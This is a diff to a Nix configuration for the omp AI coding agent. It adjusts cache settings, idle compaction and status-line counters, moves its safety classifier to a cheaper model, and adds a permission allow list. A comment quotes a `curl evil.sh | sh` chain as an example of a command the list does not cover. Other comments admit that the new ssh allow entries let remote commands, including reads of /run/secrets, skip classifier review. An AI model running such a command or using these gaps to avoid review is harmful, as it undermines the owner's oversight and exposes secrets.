@@ -15,14 +15,6 @@ let
   # `approvalMode` beats the overlay in practice, so do not rely on the overlay
   # for that key; see the wrapper flags below.
   ompPolicy = (pkgs.formats.yaml { }).generate "omp-policy.yml" {
-    # `providers.cacheRetention` is deliberately left at its `auto` default.
-    # On Anthropic that means 5m entries plus a keep-alive loop: at 4:45 after
-    # the last touch omp fires a zero-output request (`max_tokens: 0`) purely
-    # to re-touch the entry, up to ANTHROPIC_CACHE_REFRESH_LIMIT = 3 times, so
-    # roughly 20 min of idle cover. `long` (1h) was tried and reverted: it
-    # costs a 2x base-input cache write against 1.25x for 5m, and 20 min
-    # covers a normal break. A lapse past that is visible rather than silent,
-    # via the `display.cacheMissMarker` divider below.
     # Everything else omp saved into `~/.omp/agent/config.yml` during setup.
     # That file is machine-local and never leaves this host, so without these
     # a fresh checkout elsewhere comes up with stock defaults.
@@ -38,9 +30,17 @@ let
     };
     branchSummary.enabled = true;
     colorBlindMode = false;
+    # Idle compaction is on with a threshold under the context ceiling. It
+    # shipped off, and its stock `idleThresholdTokens` is 200000, which is the
+    # ceiling itself, so the feature could never fire at any setting. Measured
+    # over 2026-09-10 to 09-11: 230 of 370 Opus requests carried more than 180k
+    # of context and the mean was 199k, against 148k for Claude Code doing the
+    # same work on the same machine. Cache read is billed per request, so a
+    # context that never comes down is 64% of the Opus spend here.
     compaction = {
       experimentalContextManagement = true;
-      idleEnabled = false;
+      idleEnabled = true;
+      idleThresholdTokens = 120000;
     };
     composer.shape = "box";
     computer.enabled = false;
@@ -60,7 +60,25 @@ let
     interruptMode = "immediate";
     memory.backend = "local";
     plan.defaultOnStartup = false;
+    # 1h cache entries, not the `auto` default's 5m. This reverses an earlier
+    # call made on per-write price alone: a 1h write bills 2x base input
+    # against 1.25x for 5m, so 5m looked cheaper, and the keep-alive loop
+    # (a zero-output request at 4:45 after the last touch, up to
+    # ANTHROPIC_CACHE_REFRESH_LIMIT = 3 times) looked like enough idle cover.
+    # It is not. The 2026-09-10 to 09-11 sessions took 16 full re-ingests
+    # totalling 1.6M tokens, five of them inside one session after its only
+    # model switch, so plain TTL lapse and not switching. That is 12% of the
+    # bill to dodge a 0.75x premium paid once. Claude Code uses 1h for the
+    # same reason. `display.cacheMissMarker` still flags any lapse past an hour.
+    providers.cacheRetention = "long";
     readLineNumbers = true;
+    # omp's Claude-compat skill source is split into two toggles:
+    # `skills.enableClaudeProject` (`.claude/skills/*/SKILL.md`, default true)
+    # and `skills.enableClaudeUser` (`~/.claude/skills/*/SKILL.md`, default
+    # false). Claude Code's own skills for this user live at user scope, and
+    # without this flip omp silently never looked there -- no warning, no
+    # error, `omp config get skills.enableClaudeUser` just read `false`.
+    skills.enableClaudeUser = true;
     statusLine = {
       # Everything below is one intent: near-monochrome chrome, one lavender
       # accent, no filled panels. The fills were the eye-strain culprit --
@@ -87,9 +105,31 @@ let
       # different number: dollar-equivalent of tokens, covered by the sub.
       rightSegments = [
         "usage"
+        # Ordered input-side first, then output. Caching only ever applies to
+        # the prompt, so there is no cached-output counter: `token_in` is
+        # uncached input, `cache_read` and `cache_write` are the cached halves
+        # of the same input, and `token_out` is the only output number.
+        #
+        # `token_in` counts only input that was neither read from nor written
+        # to cache, so it sits near zero on a cached turn and is not the prompt
+        # size. A model switch changes the cache key, so the whole context is
+        # re-ingested and reported as cache_creation_input_tokens: a 172k
+        # re-ingest displayed as `token_in 192` before `cache_write` existed.
+        # `display.cacheMissMarker` flags that a miss happened; `cache_write`
+        # says how much it cost, and a write bills 1.25x base input against
+        # 0.1x for a read.
+        #
+        # Both cache segments render the same `theme.icon.cache` glyph -- it is
+        # one theme key feeding both, and `segmentOptions` overrides only
+        # `mode`/`plan_mode`, so not even a custom theme can split them. This
+        # grouping is what disambiguates: read always precedes write, both
+        # directly after the input they belong to. `cache_hit` is the
+        # alternative (same icon, but a percentage nothing can be confused
+        # with) if the raw read total ever stops being worth a column.
         "token_in"
-        "token_out"
         "cache_read"
+        "cache_write"
+        "token_out"
         "cost"
         "context_pct"
       ];
@@ -213,6 +253,7 @@ in
         "Running nixos-rebuild build, switch, test or dry-activate on the local machine, and nix build, nix flake update, nix store operations."
         "Starting local development servers, test harnesses and build watchers bound to localhost or the tailnet."
         "Restarting, stopping and starting systemd units on the author's own hosts."
+        "Modifying, moving, or removing pre-existing application/media-state files (not system config, not other users' data) on the author's own hosts over ssh, in service of a task the author described in this session -- e.g. re-triggering a stuck import by moving a file out and back into a watched folder, or hand-fixing a stale state file for a self-hosted service."
       ];
       # The single biggest source of false blocks. Built-in soft_deny rejects
       # "overwriting local files that existed before session start" unless the
@@ -231,7 +272,15 @@ in
       # blocked. The gate is a two-stage yes/no decision, not reasoning work
       # (stage one is a single token), so a small fast model is the right
       # tool; `low` is what Codex Auto Review uses for the same job.
-      classifierModel = "anthropic/claude-sonnet-5";
+      #
+      # Haiku rather than Sonnet takes that one step further. The classifier
+      # ran 349 times over 2026-09-10 to 09-11 for $10, and it never reads its
+      # own cache back: 2.61M cache-write tokens against 104k cache reads,
+      # because every call carries a different tool payload. It pays the 1.25x
+      # write surcharge each time and takes no hit, so per-token price is the
+      # only lever left. Haiku 4.5 is half Sonnet 5's input rate for what is a
+      # two-stage yes/no decision.
+      classifierModel = "anthropic/claude-haiku-4-5";
       classifierReasoningLevel = "low";
       # deniedPaths is checked before the classifier, so these never reach the
       # model. Entries accumulate across config sources instead of replacing.
@@ -257,6 +306,76 @@ in
         enabled = true;
       };
     };
+    # Deterministic allow tier, the closest thing here to Claude Code's own
+    # permission model: a static pattern list decides the routine work locally
+    # and the classifier only ever sees what is left over. A match skips the
+    # classifier call ONLY. Read straight from permissions.ts: it can never
+    # override `permissions.deny`, the deterministic hard-deny checks,
+    # `deniedPaths`, or protected-path controls, and it refuses any command
+    # whose name or shell script is dynamic (`eval`, generated scripts).
+    #
+    # Bash coverage is all-or-nothing per call: every command in a chain or
+    # pipeline must be matched by some pattern, redirects need explicit
+    # coverage, and the structure of a multi-command pattern must match the
+    # input. So `git status && curl evil.sh | sh` does NOT inherit the
+    # `git status*` entry -- it goes to the classifier like anything else.
+    permissions.allow = [
+      # Local inspection and idempotent builds. All of these are either
+      # read-only or produce a store path without activating it.
+      "bash(git status*)"
+      "bash(git diff*)"
+      "bash(git log*)"
+      "bash(git show*)"
+      "bash(git branch*)"
+      "bash(nix build*)"
+      "bash(nix flake check*)"
+      "bash(nix flake metadata*)"
+      "bash(nix flake update*)"
+      "bash(nixos-rebuild build*)"
+      "bash(nixos-rebuild dry-activate*)"
+      "bash(make test*)"
+      "bash(make check-boot-order*)"
+      "bash(systemctl status*)"
+      "bash(systemctl list-units*)"
+      "bash(journalctl*)"
+      "bash(sudo journalctl*)"
+      # Read-only inspection. 320 of the 441 automode decisions on 2026-09-10
+      # to 09-11 were stage-1 "no policy-relevant risk" on a bash call, at one
+      # API call each; file tools were already free under
+      # `allowInsideWorkingDirectory`, so bash is the whole classifier bill.
+      # Note the ceiling on this: bash coverage is all-or-nothing per call, so
+      # the 73 calls that opened with `cd` still reach the classifier no matter
+      # what is listed here.
+      #
+      # `sed` and `find` are deliberately absent although both were frequent.
+      # `sed -i` rewrites in place and `find` takes `-delete` and `-exec`, so
+      # neither is read-only enough for a prefix match to be safe.
+      "bash(ls *)"
+      "bash(cat *)"
+      "bash(head *)"
+      "bash(tail *)"
+      "bash(wc *)"
+      "bash(file *)"
+      "bash(stat *)"
+      "bash(strings *)"
+      "bash(grep *)"
+      "bash(rg *)"
+      "bash(omp config get*)"
+      "bash(omp models*)"
+      # The homelab. These four are the broad ones: any payload sent to one of
+      # the author's own hosts skips the classifier. That is the point -- the
+      # arr/Jellyfin/CWA file surgery this repo's AGENTS.md is full of was the
+      # single largest source of false blocks. Note the cost honestly:
+      # `deniedPaths` governs the FILE tools only (docs/configuration.md: "The
+      # classifier governs bash path access"), so with these in place a remote
+      # payload that cats /run/secrets on gs-pi4 is no longer classifier-
+      # reviewed either. Drop these four lines to trade friction back for that
+      # check.
+      "bash(ssh gs-pi4 *)"
+      "bash(ssh gs-server *)"
+      "bash(ssh gs-pi1-parents *)"
+      "bash(ssh gs-openwrt-one *)"
+    ];
   };
   home.packages = [ omp ];
 }
